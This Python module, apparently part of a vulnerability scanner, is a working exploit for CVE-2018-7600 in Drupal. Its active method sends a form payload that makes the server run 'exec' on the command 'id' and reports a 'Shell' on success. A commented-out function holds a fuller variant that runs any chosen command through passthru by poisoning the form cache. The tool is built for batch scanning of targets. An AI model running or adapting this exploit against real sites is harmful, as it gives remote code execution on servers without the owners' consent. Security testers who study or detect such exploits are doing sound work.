#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from bs4 import BeautifulSoup
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()





class Cve_2018_7600:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,baseurl):
        url2 = baseurl + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
        try:
            # payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
            #            'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.txt'}

            r = requests.post(url2, data=data, verify=self.verify,proxies=self.proxy,headers=self.header)
            # check = requests.get(baseurl + '/hello.txt', verify=self.verify,proxies=self.proxy,headers=self.header)
            if "uid=" in r.text:
                OutPrintInfoSuc("Drupal", f"存在Drupal CVE-2018-7600: {url2}")
                if not self.batch:
                    OutPrintInfo("Drupal", f"响应:\n{r.text.strip()}")

                else:
                    OutPutFile("drupal_2018_7600.txt",f"Shell: {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Drupal", f"目标不存在Drupal CVE-2018-7600")


        except Exception:
            if not self.batch:
                OutPrintInfo("Drupal", "目标请求出错")
    # def pwn_target(self,target, command):
    #     if not self.batch:
    #         OutPrintInfo("Drupal", 'Poisoning a form and including it in cache.')
    #     get_params = {'q': 'user/password', 'name[#post_render][]': "passthru", 'name[#type]': 'markup',
    #                   'name[#markup]': command}
    #     post_params = {'form_id': 'user_pass', '_triggering_element_name': 'name', '_triggering_element_value': '',
    #                    'opz': 'E-mail new Password'}
    #     try:
    #         r = requests.post(target, params=get_params, data=post_params, verify=self.verify, proxies=self.proxy)
    #         soup = BeautifulSoup(r.text, "html.parser")
    #
    #         form = soup.find('form', {'id': 'user-pass'})
    #         form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    #         if form_build_id:
    #             if not self.batch:
    #                 OutPrintInfo("Drupal", f'Poisoned form ID: {form_build_id}')
    #                 OutPrintInfo("Drupal", f'Triggering exploit to execute: {command}')
    #
    #             get_params = {'q': 'file/ajax/name/#value/' + form_build_id}
    #             post_params = {'form_build_id': form_build_id}
    #             r = requests.post(target, params=get_params, data=post_params, verify=self.verify, proxies=self.proxy)
    #             parsed_result = r.text.split('[{"command":"settings"')[0].strip()
    #             if "uid=" in parsed_result:
    #                 OutPrintInfoSuc("Drupal", f"存在CVE-2018-7600漏洞: {target}")
    #                 if not self.batch:
    #                     OutPrintInfo("Drupal",f"响应:\n{parsed_result.strip()}")
    #                 else:
    #                     OutPutFile("drupal_2018_7600.txt", f"存在CVE-2018-7600漏洞: {target}")
    #     except Exception:
    #         if not self.batch:
    #             OutPrintInfo("Drupal","ERROR: Something went wrong.")


    def main(self,target):
        self.batch = target["batch_work"]
        baseurl = target['url'].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            print('################################################################')
            print('# Proof-Of-Concept for CVE-2018-7600')
            print('# by Vitalii Rudnykh')
            print('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
            print('# https://github.com/a2u/CVE-2018-7600')
            print('################################################################')
            print('Provided only for educational or information purposes')
            OutPrintInfo("Drupal", "开始检测Drupal CVE-2018-7600...")
        self.send_payload(baseurl)
        if not self.batch:
            OutPrintInfo("Drupal", "Drupal CVE-2018-7600检测结束")



